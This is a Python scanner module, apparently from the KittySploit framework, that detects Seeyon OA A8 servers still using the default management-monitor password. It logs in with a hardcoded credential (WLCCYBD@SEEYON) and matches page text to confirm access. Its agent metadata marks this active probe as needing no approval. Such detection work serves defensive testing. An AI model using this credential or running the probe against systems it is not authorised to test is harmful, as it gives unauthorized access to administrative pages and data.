#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Seeyon OA A8-m has status monitoring page information leakage."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Seeyon A8 Management Monitor - Default Login Detection',
        'description': 'Seeyon OA A8-m has status monitoring page information leakage. Attackers can obtain sensitive information such as website paths and user names for further attacks. Attackers can use this vulnerability to directly enter the application system or management system to conduct system, web page, data tampering and deletion, illegally obtaining system and user data, and may even cause the server to collapse.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'seeyon', 'oa', 'default-login', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20status.jsp%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html',
            'https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/default-pwd/seeyon-a8-management-monitor-default-password.yaml',
        ],
    }

    def run(self):
        path = '/seeyon/management/index.jsp'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='password=WLCCYBD%40SEEYON\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<title>A8 Management Monitor</title>', 'Connection Pooling',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Seeyon A8 Management Monitor - Default Login detected', path=path)
            return True
        return False

